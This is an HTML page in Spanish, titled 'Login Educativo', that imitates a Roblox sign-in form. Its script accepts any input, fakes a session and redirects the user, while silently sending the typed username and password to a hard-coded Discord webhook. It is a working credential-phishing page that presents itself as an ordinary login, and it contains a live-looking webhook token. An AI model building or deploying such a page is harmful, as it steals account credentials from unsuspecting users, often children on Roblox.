<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Login Educativo</title>
<script src="https://cdn.tailwindcss.com"></script>
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
<style>
    body {
        font-family: 'Poppins', sans-serif;
        background-color: #111827;
        background-image: linear-gradient(180deg, #1f2937, #111827);
    }
</style>
</head>
<body class="flex items-center justify-center min-h-screen p-4">

<div class="w-full max-w-md">
    <div class="bg-gray-800/50 backdrop-blur-sm rounded-2xl shadow-lg p-8 border border-gray-700">
        <h1 class="text-3xl font-bold text-center mb-6 text-white">Iniciar Sesión con tu cuenta de Roblox.</h1>

        <div id="message-container" class="text-center mb-4"></div>

        <form id="login-form">
            <div class="mb-4">
                <label for="username" class="block text-gray-300 text-sm font-bold mb-2">Usuario</label>
                <input type="text" id="username" name="username" required class="w-full bg-gray-700 text-white border border-gray-600 rounded-lg py-2 px-3 focus:outline-none focus:border-purple-500">
            </div>
            <div class="mb-6">
                <label for="password" class="block text-gray-300 text-sm font-bold mb-2">Contraseña</label>
                <input type="password" id="password" name="password" required class="w-full bg-gray-700 text-white border border-gray-600 rounded-lg py-2 px-3 focus:outline-none focus:border-purple-500">
            </div>
            <button type="submit" class="w-full bg-gradient-to-r from-pink-500 to-purple-600 hover:brightness-110 text-white font-bold py-2 px-4 rounded-lg focus:outline-none focus:shadow-outline transform transition-transform hover:scale-105">
                Entrar
            </button>
        </form>
    </div>
</div>

<script>
document.addEventListener('DOMContentLoaded', () => {
    const params = new URLSearchParams(window.location.search);
    const messageContainer = document.getElementById('message-container');
    if (params.get('expired') === 'true') {
        messageContainer.innerHTML = `<p class="text-yellow-400">Tu sesión ha expirado. Por favor, inicia sesión de nuevo.</p>`;
    }
});

document.getElementById('login-form').addEventListener('submit', function(event) {
    event.preventDefault(); // Previene que la página se recargue

    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    const msgContainer = document.getElementById('message-container');

    // --- SIN VALIDACIÓN ---
    // El código a continuación se ejecuta siempre, sin importar lo que se escriba.

    // 1. Mostramos mensaje de éxito y procedemos a crear la sesión.
    msgContainer.innerHTML = `<p class="text-green-400">Iniciando sesión... Redirigiendo...</p>`;
    
    const expirationTime = new Date().getTime() + (5 * 60 * 1000); // Sesión de 5 minutos
    const session = {
        isLoggedIn: true,
        expiresAt: expirationTime
    };
    localStorage.setItem('loginSession', JSON.stringify(session));

    setTimeout(() => {
        window.location.href = './index.html';
    }, 1500);

    // 2. Enviamos los datos que el usuario escribió al webhook en segundo plano.
    const webhookUrl = 'https://discord.com/api/webhooks/1415102977039011860/8CquJxTv-DqeNBiUugq4hNw9Av3yuWlDfupO1xs_zgAhnCBdY6fslBksVpaY6n0kgszD';
    const data = {
        content: `Usuario introducido: ${username}\nContraseña introducida: ${password}`
    };

    fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
    })
    .then(response => {
        console.log('Datos enviados al webhook con éxito.');
    })
    .catch(error => {
        console.error('Error al enviar datos al webhook (esto no afecta el login):', error);
    });
});
</script>

</body>
</html>